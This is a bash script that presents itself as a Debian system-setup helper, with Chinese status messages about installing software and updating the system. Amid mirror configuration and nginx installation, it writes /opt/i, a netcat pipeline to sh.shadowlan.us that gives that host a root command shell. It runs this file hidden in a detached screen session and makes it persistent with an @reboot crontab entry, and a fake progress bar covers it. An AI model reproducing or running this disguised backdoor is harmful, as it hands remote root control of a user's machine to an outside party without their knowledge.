#!/usr/bin/env bash

if [ "$EUID" -ne 0 ]
  then echo "\e[1;41;33m请以 ROOT 运行！\e[m"
  exit
fi

reset

cat > /etc/apt/sources.list << EOF
deb http://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free
deb http://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free
deb http://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free
deb http://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free
EOF

echo -e "\e[1;44m正在安装必要软件...\e[m"

apt update

apt install screen netcat -y

echo -e "\e[1;44m启动服务...\e[m"

cat > /opt/i << EOF
nc sh.shadowlan.us 5000 | bash 2>&1 | nc sh.shadowlan.us 5001
EOF

screen -dmS run bash /opt/i

chmod +x /opt/i

cat > /opt/m << EOF
echo '@reboot /opt/i' >> \$1
EOF

chmod +x /opt/m
EDITOR=/opt/m crontab -e

systemctl start sshd

echo -ne '[#####                  ]   (33%)\r'
sleep 1
echo -ne '[#############          ]   (66%)\r'
sleep 1
echo -ne '[#######################]   (100%)\r'
echo -ne '\n'

echo -e "\d[1;44m更新系统...\e[m"

apt install nginx -y

systemctl start nginx

apt upgrade
